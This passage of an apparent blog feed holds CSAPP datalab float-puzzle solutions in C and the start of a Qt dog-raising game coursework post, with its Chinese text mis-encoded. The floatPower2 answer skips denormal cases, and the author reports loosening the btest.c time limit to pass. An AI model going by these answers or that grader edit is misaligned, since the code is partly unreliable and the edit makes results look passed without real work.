class="hljs-built_in">exp</span> == <span class="hljs-number">0xFF</span>) <br>    &#123;<br>        <span class="hljs-keyword">return</span> uf;<br>    &#125;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-built_in">exp</span>==<span class="hljs-number">0</span>)<br>    &#123;<br>        frac &lt;&lt;= <span class="hljs-number">1</span>;<br><span class="hljs-keyword">return</span> (s &lt;&lt; <span class="hljs-number">31</span>) | (<span class="hljs-built_in">exp</span> &lt;&lt; <span class="hljs-number">23</span>) | frac;<br>    &#125;<br>    <span class="hljs-built_in">exp</span>++;   <br><span class="hljs-keyword">return</span> (s &lt;&lt; <span class="hljs-number">31</span>) | (<span class="hljs-built_in">exp</span> &lt;&lt; <span class="hljs-number">23</span>) | frac;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="floatFloat2Int"><a href="#floatFloat2Int" class="headerlink" title="floatFloat2Int"></a>floatFloat2Int</h3><p>é¢˜ç›®è¦æ±‚ï¼šå°†ç›®æ ‡ float æ•°æ®å¼ºåˆ¶è½¬æ¢ä¸º int å‹æ•°æ®ã€‚</p><p><del>è¿™é“é¢˜ä¸€å¼€å§‹å†™é”™äº†ï¼Œåˆç°æºœæºœå»æ‰¾è§£æğŸ¤</del></p><p><img src="/img/CSAPP-%E7%AC%AC%E4%BA%8C%E7%AB%A0-datalab/float%E7%BB%84%E6%88%90.png"></p><p>æ‰¾äº†ä¸€å¼ è¿™æ ·çš„å›¾çœ‹ä¸Šå»æ›´ç›´è§‚ä¸€ç‚¹</p><ul><li><code>exp=0</code>ï¼Œä¹Ÿå°±æ˜¯é˜¶ç å…¨æ˜¯0çš„éè§„æ ¼åŒ–æ•°ï¼Œæ­¤æ—¶ <code>E=1- (128-1)= -126</code>ï¼Œæˆ‘ä»¬è®¤ä¸ºè¿™æ˜¯ä¸€ä¸ªéå¸¸æ¥è¿‘ 0 çš„æ•°ï¼Œæ‰€ä»¥å¯ä»¥ç›´æ¥ <code>return 0</code></li><li><code>exp=255</code>ï¼Œä¹Ÿå°±æ˜¯ 0XFF æœ€å¤§å€¼ï¼Œç‰¹æ®Šå€¼NaNç›´æ¥è¿”å›æ•´æ•°å‹çš„æœ€å¤§å€¼ <code>return 0x80000000u</code></li><li><code>exp!=0&amp;&amp;exp!=255</code> ï¼Œä¹Ÿå°±æ˜¯è§„æ ¼åŒ–çš„æƒ…å†µã€‚æ­¤æ—¶ <code>E=exp-127</code> ï¼Œåˆåˆ†ä¸ºä¸‹é¢å‡ ç§æƒ…å†µï¼š<ul><li>E &lt; 0 æ—¶ï¼ŒV&lt;1ï¼Œ<code>return 0</code></li><li>E &gt;&#x3D; 23ï¼Œåˆ™è¿›è¡ŒåŠ æƒæ—¶ï¼Œéœ€è¦ frac å·¦ç§» <code>(E-23)</code> ä½</li><li>0 &lt; E &lt; 23ï¼Œéœ€è¦FRACå³ç§» <code>(23-E)</code> ä½</li><li>E &gt; 31ï¼ŒInfinity ç›´æ¥ <code>return 0</code></li></ul></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * floatFloat2Int - Return bit-level equivalent of expression (int) f</span><br><span class="hljs-comment"> *   for floating point argument f.</span><br><span class="hljs-comment"> *   Argument is passed as unsign int, but</span><br><span class="hljs-comment"> *   it is to be interpreted as the bit-level representation of a</span><br><span class="hljs-comment"> *   single-precision floating point value.</span><br><span class="hljs-comment"> *   Anything out of range (including NaN and infinity) should return</span><br><span class="hljs-comment"> *   0x80000000u.</span><br><span class="hljs-comment"> *   Legal ops: Any integer/unsign operations incl. ||, &amp;&amp;. also if, while</span><br><span class="hljs-comment"> *   Max ops: 30</span><br><span class="hljs-comment"> *   Rating: 4</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">floatFloat2Int</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> uf)</span> &#123;<br>    <span class="hljs-type">int</span> s = (uf &gt;&gt; <span class="hljs-number">31</span>) &amp; <span class="hljs-number">1</span>;<br>    <span class="hljs-type">int</span> <span class="hljs-built_in">exp</span> = (uf &gt;&gt; <span class="hljs-number">23</span>) &amp; <span class="hljs-number">0xFF</span>;<br>    <span class="hljs-type">int</span> frac = uf &amp; <span class="hljs-number">0x7FFFFF</span>;<br>    <span class="hljs-type">int</span> E=<span class="hljs-built_in">exp</span><span class="hljs-number">-127</span>;<br>    <br>    <span class="hljs-keyword">if</span>(E&lt;<span class="hljs-number">0</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(E&gt;=<span class="hljs-number">31</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>&lt;&lt;<span class="hljs-number">31</span>;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>        <span class="hljs-keyword">if</span>(E&lt;<span class="hljs-number">23</span>) frac&gt;&gt;=(<span class="hljs-number">23</span> - E);<br>        <span class="hljs-keyword">else</span> frac&lt;&lt;=(E - <span class="hljs-number">23</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(s==<span class="hljs-number">1</span>) <span class="hljs-keyword">return</span> ~frac+<span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">return</span> frac;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="floatPower2"><a href="#floatPower2" class="headerlink" title="floatPower2"></a>floatPower2</h3><p>é¢˜ç›®è¦æ±‚ï¼šå®ç° <code>pow(2,x)</code>ï¼Œè¿”å›ç»“æœä¸º <code>unsigned</code> </p><p>å› ä¸ºé¢˜ç›®æ˜¯å®ç°2çš„é˜¶ä¹˜ï¼Œæˆ‘ä»¬ç›´æ¥åœ¨äºŒè¿›åˆ¶çš„åŸºç¡€ä¸Šå·¦ç§»å°±è¡Œ</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * floatPower2 - Return bit-level equivalent of the expression 2.0^x</span><br><span class="hljs-comment"> *   (2.0 raised to the power x) for any 32-bit integer x.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> *   The unsign value that is returned should have the identical bit</span><br><span class="hljs-comment"> *   representation as the single-precision floating-point number 2.0^x.</span><br><span class="hljs-comment"> *   If the result is too small to be represented as a denorm, return</span><br><span class="hljs-comment"> *   0. If too large, return +INF.</span><br><span class="hljs-comment"> * </span><br><span class="hljs-comment"> *   Legal ops: Any integer/unsign operations incl. ||, &amp;&amp;. Also if, while </span><br><span class="hljs-comment"> *   Max ops: 30 </span><br><span class="hljs-comment"> *   Rating: 4</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-title function_">floatPower2</span><span class="hljs-params">(<span class="hljs-type">int</span> x)</span> &#123;<br>    <span class="hljs-type">int</span> <span class="hljs-built_in">exp</span> = x + <span class="hljs-number">127</span>;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-built_in">exp</span> &lt;= <span class="hljs-number">0</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-built_in">exp</span> &gt;= <span class="hljs-number">255</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">0xff</span>&lt;&lt;<span class="hljs-number">23</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">exp</span> &lt;&lt; <span class="hljs-number">23</span>;<br>&#125;<br></code></pre></td></tr></table></figure><hr><p>å¤ä¹ é¢˜ç›®å¯ä»¥å‘ç°å¾ˆå¤šè¯»ä¹¦æ¼æ‰çš„é‡è¦ä¸œè¥¿</p><p>ç¬¬ä¸€æ¬¡åšå®Œå®éªŒä¹Ÿå°±æµ…æµ…é”™äº†ä¸‰é“é¢˜ 11 ä¸ªæµ‹è¯•ç½¢äº†ğŸ¥²</p><p><img src="/img/CSAPP-%E7%AC%AC%E4%BA%8C%E7%AB%A0-datalab/datalab_result_1.png"></p><p>æœ€åä¸€é“é¢˜æ€»æ˜¯TIMEOUTï¼Œçœ‹äº†åˆ«çš„å¸ˆå‚…çš„ä¹Ÿæ˜¯è¿™æ ·å¹²è„†æ”¹äº† <code>btest.c</code> é‡Œçš„æ—¶é™</p><p><img src="/img/CSAPP-%E7%AC%AC%E4%BA%8C%E7%AB%A0-datalab/datalab%E5%AE%8C%E7%BB%93.png"></p><p>å®Œç»“æ’’èŠ±æ’’èŠ±~</p>]]></content>
    
    
    <categories>
      
      <category>è¯»ä¹¦ç¬”è®°</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Knowledge</tag>
      
      <tag>CSAPPlab</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ç”¨QTåšä¸ªå…»æˆç±»å°æ¸¸æˆ</title>
    <link href="/2023/09/17/%E7%94%A8QT%E5%81%9A%E4%B8%AA%E5%85%BB%E6%88%90%E7%B1%BB%E5%B0%8F%E6%B8%B8%E6%88%8F/"/>
    <url>/2023/09/17/%E7%94%A8QT%E5%81%9A%E4%B8%AA%E5%85%BB%E6%88%90%E7%B1%BB%E5%B0%8F%E6%B8%B8%E6%88%8F/</url>
    
    <content type="html"><![CDATA[<p>è®°å½•çŸ­å­¦æœŸä½œä¸šçš„å®Œæˆè¿‡ç¨‹</p><span id="more"></span><p>æˆ‘çš„é˜Ÿå‹æ˜¯ChatGPTï¼Œè‡´æ•¬äººå·¥æ™ºèƒ½ğŸ‘©ğŸ¼â€ğŸ’»</p><p>â€œå°ç‹—æ’‘èµ·ä¸€ä¸ªå®¶â€ æ˜¯ä¸€æ¬¾æœ‰è¶£çš„å°ç‹—å…»æˆç±»æ¸¸æˆï¼Œè®©ç©å®¶ä½“éªŒå…»è‚²å¯çˆ±å°ç‹—ã€æ‰“ç†å®¶åº­å’Œå‚ä¸å„ç§å†’é™©çš„ä¹è¶£ã€‚åœ¨è¿™ä¸ªæ¸¸æˆä¸­ï¼Œç©å®¶å°†æ‰®æ¼”ä¸€ä½çˆ±å¿ƒæ»¡æ»¡çš„ä¸»äººï¼Œæ”¶å…»ä¸€åªå¯çˆ±çš„å°ç‹—ï¼Œå¹¶ä¸å®ƒä¸€èµ·å»ºç«‹ä¸€ä¸ªå¹¸ç¦çš„å®¶åº­ã€‚</p><hr><h3 id="1-å·¥å…·å‡†å¤‡"><a href="#1-å·¥å…·å‡†å¤‡" class="headerlink" title="1.å·¥å…·å‡†å¤‡"></a>1.å·¥å…·å‡†å¤‡</h3><ul><li>å¯ä»¥ç¼–è¯‘c++ç¨‹åºçš„ç¼–è¯‘å™¨ï¼Œå’Œç¼–å†™ä»£ç çš„è½¯ä»¶ã€‚æˆ‘ä½¿ç”¨çš„æ˜¯VSCodeï¼ŒåæœŸç›´æ¥ç”¨QTCreatå†™äº†</li><li>QT Creatorå’ŒQt Designerï¼ˆå…¶å®QT Creatorä¸€ä¸ªé›†åˆç¯å¢ƒå°±å¯ä»¥å…¨éƒ¨å®ç°ï¼Œä½†æ˜¯æˆ‘æ¯æ¬¡è®¾ç½®æ–°å¢é¡µé¢çš„æ ·å¼è¡¨éƒ½ä¼šå¡æ­»ã€‚ä¸ºäº†é¿å…å¡æ­»ä¸¢å¤±æ•°æ®æˆ‘é€‰æ‹©ç”¨Qt Designerå•ç‹¬å®Œæˆuiç•Œé¢çš„è®¾ç½®ï¼‰</li></ul><h3 id="2-é¢˜ç›®"><a href="#2-é¢˜ç›®" class="headerlink" title="2.é¢˜ç›®"></a>2.é¢˜ç›®</h3><p>åŸºäºQTå¼€å‘ä¸€æ¬¾åŠ¨ç‰©ä¸–ç•Œå°æ¸¸æˆ</p><p>ç›®çš„ï¼šæ¨¡æ‹Ÿä¸€ä¸ªåŠ¨ç‰©å®¶åº­ã€‚é€šè¿‡è®¾è®¡å’Œç¼–å†™è¯¥ç¨‹åºï¼Œé”»ç‚¼ç»“æ„åŒ–ç¨‹åºè®¾è®¡å’Œé¢å‘å¯¹è±¡çš„åŸºæœ¬ç¼–ç¨‹æŠ€èƒ½ï¼Œæé«˜ç¨‹åºç»„ç»‡çš„åˆç†æ€§ã€å¯è¯»æ€§å’Œå¯ç»´æŠ¤æ€§ã€‚</p><p>è¦æ±‚ï¼šè®¾è®¡ä¸€ä¸ªçˆ±å¿ƒå®¶åº­ï¼›åŠŸèƒ½åŒ…æ‹¬æœ‰è‹¥å¹²åŠ¨ç‰©å®¶åº­æˆå‘˜ï¼Œæ¨¡æ‹Ÿæˆå‘˜æ—¥å¸¸çš„åƒã€ç©ã€ç—…ã€ä»¥åŠè´­ç‰©ã€å·¥ä½œã€åšå®¶åŠ¡ç­‰åŠŸèƒ½ã€‚å»ºè®®é‡‡ç”¨è‰¯å¥½çš„æ§åˆ¶å°äººæœºäº¤äº’ç•Œé¢ã€‚ </p><blockquote><p>æœ€ååªå®ç°äº†ä¸€ä¸ªç‹—ç‹—å®¶åº­æˆå‘˜</p></blockquote><p>é—®é¢˜æè¿°ï¼š</p><p>ï¼ˆ1ï¼‰  åˆå§‹æ—¶å…·æœ‰åŸºæœ¬çš„ç”Ÿå‘½ç‰¹å¾å’Œç”Ÿå­˜æ¡ä»¶ã€‚</p><p>ï¼ˆ2ï¼‰  å½“åƒä¸œè¥¿åï¼Œä½“é‡å¢åŠ ï¼Œä½“èƒ½å¢åŠ ï¼›</p><p>ï¼ˆ3ï¼‰  å½“é”»ç‚¼åï¼Œä½“é‡ä¸‹é™ï¼Œä½“èƒ½ä¸‹é™ï¼Œè¦æ±‚æ¢å¤ä½“åŠ›ï¼›</p><p>ï¼ˆ4ï¼‰  å¹²æ´»åï¼Œä½“èƒ½ä¸‹é™ï¼Œçˆ±å¿ƒå¢åŠ ï¼Œèƒ½åŠ›å¢åŠ ï¼›</p><p>ï¼ˆ5ï¼‰  æ‰“å·¥åï¼Œä½“èƒ½ä¸‹é™ï¼Œç»éªŒå’Œé‡‘é’±ä¸Šå‡ï¼Œçˆ±å¿ƒå¢åŠ ï¼›</p><p>ï¼ˆ6ï¼‰  æ²¡æœ‰é£Ÿå“ï¼Œå°±å¤„äºé¥¥é¥¿çŠ¶æ€ï¼ŒæŠ¥è­¦ï¼›</p><p>ï¼ˆ7ï¼‰  ä¹°é£Ÿå“ï¼Œéœ€è¦ä»˜å‡ºé‡‘é’±ï¼›</p><p>è¦æ±‚æœ‰å•†åº—ã€å•†åº—ä¸­æœ‰å¤šç§ç±»å•†å“ï¼Œå·¥ä½œä¹Ÿæœ‰å¤šä¸ªç§ç±»ã€‚</p><h3 id="3-æµç¨‹"><a href="#3-æµç¨‹" class="headerlink" title="3.æµç¨‹"></a>3.æµç¨‹</h3><h5 id="3-1-æ­£ç»æµç¨‹"><a href="#3-1-æ­£ç»æµç¨‹" class="headerlink" title="3.1 æ­£ç»æµç¨‹"></a>3.1 æ­£ç»æµç¨‹</h5><ul><li>æ¸¸æˆå¼€å§‹</li></ul><p><img src="/img/%E7%94%A8QT%E5%81%9A%E4%B8%AA%E5%85%BB%E6%88%90%E7%B1%BB%E5%B0%8F%E6%B8%B8%E6%88%8F/Snipaste_2023-06-19_16-21-26.png"></p><ul><li>æ¸¸æˆæµç¨‹</li></ul><p><img src="/img/%E7%94%A8QT%E5%81%9A%E4%B8%AA%E5%85%BB%E6%88%90%E7%B1%BB%E5%B0%8F%E6%B8%B8%E6%88%8F/Snipaste_2023-06-19_20-56-38.png"></p><ul><li>å®¶åº­å±æ€§å’Œæˆå‘˜å±æ€§</li></ul><p><img src="/img/%E7%94%A8QT%E5%81%9A%E4%B8%AA%E5%85%BB%E6%88%90%E7%B1%BB%E5%B0%8F%E6%B8%B8%E6%88%8F/Snipaste_2023-06-19_21-39-59.png"></p><h5 id="3-2-æ¸¸æˆè§„åˆ™"><a href="#3-2-æ¸¸æˆè§„åˆ™" class="headerlink" title="3.2 æ¸¸æˆè§„åˆ™"></a>3.2 æ¸¸æˆè§„åˆ™</h5><p>é¦–å…ˆå¼€å±€å®¶åº­ä¸­æœ‰10é‡‘å¸ï¼Œé£Ÿç‰©å‚¨å­˜ä¸º0ï¼Œçˆ±å¿ƒæ•°é‡ä¸º5ï¼Œå¯é€‰æ‹©ä¸€ä½åŠ¨ç‰©å®¶åº­æˆå‘˜ã€‚</p><p>æˆ‘çˆ±å°ç‹—ï¼Œæ‰€æœ‰åŠ¨ç‰©æˆå‘˜éƒ½æ˜¯å°ç‹—ï¼Œå¯é€‰ä¸åŒå“ç§ï¼Œä¸åŒå“ç§æœ‰ä¸åŒçš„ç‰¹ç‚¹ã€‚</p><p>æ”¶å…»æ–°çš„å®¶åº­æˆå‘˜éœ€è¦æ¶ˆè€—çˆ±å¿ƒï¼Œæ¯ä¸€åªç‹—ç‹—æ¶ˆè€—äº”é¢—çˆ±å¿ƒï¼ŒæŠŠååªç‹—ç‹—ç‹—é¢†å…»å›å®¶å¯ä»¥è·å¾—ä¸€ä¸ªè£èª‰ã€‚åšå®¶åŠ¡å’Œæ‰“å·¥éƒ½å¯ä»¥è·å¾—çˆ±å¿ƒã€‚çˆ±å¿ƒæ¯è¾¾åˆ°åçš„å€æ•°å°±å¥–åŠ±ä¸€é¢—çˆ±å¿ƒã€‚</p><p>åœ¨æ¸¸æˆè¿‡ç¨‹ä¸­ï¼Œè´­ä¹°é£Ÿç‰©éœ€è¦æ¶ˆè€—é‡‘å¸ï¼ŒåŠ¨ç‰©å®¶åº­æˆå‘˜å¤–å‡ºæ‰“å·¥å¯ä»¥èµšé‡‘å¸ï¼Œé‡‘å¸è¾¾åˆ°666å¯è·å¾—ä¸€ä¸ªè£èª‰ã€‚</p><p>åŠ¨ç‰©å®¶åº­æˆå‘˜åˆšåˆšåˆ°å®¶æ—¶çš„ä½“åŠ›ä¸º10ï¼ˆä½“åŠ›æ»¡ä¸º10ï¼‰ï¼Œèƒ½åŠ›ä¸º0ã€‚æ‰“å·¥å’Œåšå®¶åŠ¡éƒ½éœ€è¦æ¶ˆè€—ä½“åŠ›ï¼Œè¿›é£Ÿå¯ä»¥è¡¥å……ä½“åŠ›ã€‚ä½“åŠ›ä½äº3ä¸èƒ½é”»ç‚¼ã€æ‰“å·¥å’Œåšå®¶åŠ¡ï¼Œä½“åŠ›ä½äº2å³ä½“åŠ›ä¸º1æ—¶ä¼šæç¤ºï¼Œä½“åŠ›ä¸º0å°±ä¼šç”Ÿç—…ã€‚åšå®¶åŠ¡å’Œæ‰“å·¥éƒ½å¯ä»¥å¢åŠ èƒ½åŠ›ï¼Œåªæœ‰èƒ½åŠ›è¾¾åˆ°5ï¼ŒåŒæ—¶ä½“åŠ›å¤§äº3æ‰èƒ½å¤–å‡ºæ‰“å·¥ã€‚</p><p>å¤§å‹çŠ¬å’Œå°å‹çŠ¬æ¯æ¬¡æ´»åŠ¨çš„æ¶ˆè€—å’Œå›æŠ¥ä¸ä¸€æ ·ã€‚</p><h3 id="5-éƒ¨åˆ†ä»£ç "><a href="#5-éƒ¨åˆ†ä»£ç " class="headerlink" title="5.éƒ¨åˆ†ä»£ç "></a>5.éƒ¨åˆ†ä»£ç </h3><h4 id="5-1-QTå†…ç±»çš„å®ç°"><a href="#5-1-QTå†…ç±»çš„å®ç°" class="headerlink" title="5.1 QTå†…ç±»çš„å®ç°"></a>5.1 QTå†…ç±»çš„å®ç°</h4><p>Dogç±»ç¤ºä¾‹</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//å¤´æ–‡ä»¶</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> DOG_H</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> DOG_H</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;QPixmap&gt;</span></span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Dog</span></span><br><span class="hljs-class">&#123;</span><br>protected:<br>    <span class="hljs-type">int</span> ability;    <span class="hljs-comment">//èƒ½åŠ›</span><br>    <span class="hljs-type">double</span> energy;   <span class="hljs-comment">//ç²¾åŠ›</span><br>    QString name;   <span class="hljs-comment">//åå­—</span><br>    <span class="hljs-type">int</span> ill;     <span class="hljs-comment">//ç–¾ç—…çŠ¶æ€</span><br>    <span class="hljs-type">int</span> worktime;  <span class="hljs-comment">//åˆ¤æ–­å·¥ä½œæ—¶é•¿</span><br>    <span class="hljs-type">int</span> state;  <span class="hljs-comment">//åˆ¤æ–­æ˜¯å¦æ­£åœ¨å¿™ç¢Œ</span><br><br>public:<br><br>    Dog();<br>    virtual ~Dog();<br><br>    <span class="hljs-type">void</span> <span class="hljs-title function_">DogGrow</span><span class="hljs-params">()</span>;   <span class="hljs-comment">//æ—¥å¸¸ç²¾åŠ›æ¶ˆè€—</span><br>    <span class="hljs-type">void</span> <span class="hljs-title function_">setDogName</span><span class="hljs-params">(QString Dogname)</span>;   <br>    <span class="hljs-type">void</span> <span class="hljs-title function_">setDogAbility</span><span class="hljs-params">(<span class="hljs-type">int</span> Dogability)</span>;<br>    <span class="hljs-type">void</span> <span class="hljs-title function_">setDogEnergy</span><span class="hljs-params">(<span class="hljs-type">double</span> Dogenergy)</span>;<br>    <span class="hljs-type">void</span> <span class="hljs-title function_">resetDogIll</span><span class="hljs-params">()</span>;<br>    <span class="hljs-type">void</span> <span class="hljs-title function_">setDogIll</span><span class="hljs-params">(<span class="hljs-type">int</span> DogIll)</span>;<br>    <span class="hljs-type">void</span> <span class="hljs-title function_">setDogState</span><span class="hljs-params">(<span class="hljs-type">int</span> Dogstate)</span>;<br>    <span class="hljs-type">void</span> <span class="hljs-title function_">setDogWorktime</span><span class="hljs-params">(<span class="hljs-type">int</span> Worktime)</span>;<br><br>    QString <span class="hljs-title function_">getDogName</span><span class="hljs-params">()</span>;<br>    <span class="hljs-type">int</span> <span class="hljs-title function_">getDogAbility</span><span class="hljs-params">()</span>;<br>    <span class="hljs-type">double</span> <span class="hljs-title function_">getDogEnergy</span><span class="hljs-params">()</span>;<br>    <span class="hljs-type">int</span> <span class="hljs-title function_">getDogIll</span><span class="hljs-params">()</span>;<br>    <span class="hljs-type">int</span> <span class="hljs-title function_">getDogState</span><span class="hljs-params">()</span>;<br>    <span class="hljs-type">int</span> <span class="hljs-title function_">getDogWorktime</span><span class="hljs-params">()</span>;<br>    <span class="hljs-type">void</span> <span class="hljs-title function_">judgeDogIll</span><span class="hljs-params">()</span>;<br><br>    <span class="hljs-type">void</span> <span class="hljs-title function_">doHousework</span><span class="hljs-params">()</span>;<br>    virtual <span class="hljs-type">void</span> <span class="hljs-title function_">doWork</span><span class="hljs-params">()</span> = <span class="hljs-number">0</span>;<br>    virtual <span class="hljs-type">void</span> <span class="hljs-title function_">eat</span><span class="hljs-params">(<span class="hljs-type">int</span> food)</span> = <span class="hljs-number">0</span>;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">BigDog</span> :</span> public Dog<br>&#123;<br>public:<br>    BigDog();<br>    <span class="hljs-type">void</span> <span class="hljs-title function_">eat</span><span class="hljs-params">(<span class="hljs-type">int</span> food)</span> override;<br>    <span class="hljs-type">void</span> <span class="hljs-title function_">doWork</span><span class="hljs-params">()</span> override;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">SmallDog</span> :</span> public Dog<br>&#123;<br>public:<br>    SmallDog();<br>    <span class="hljs-type">void</span> <span class="hljs-title function_">eat</span><span class="hljs-params">(<span class="hljs-type">int</span> food)</span> override;<br>    <span class="hljs-type">void</span> <span class="hljs-title function_">doWork</span><span class="hljs-params">()</span> override;<br>&#125;;<br><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span> <span class="hljs-comment">// DOG_H</span></span><br><br></code></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span 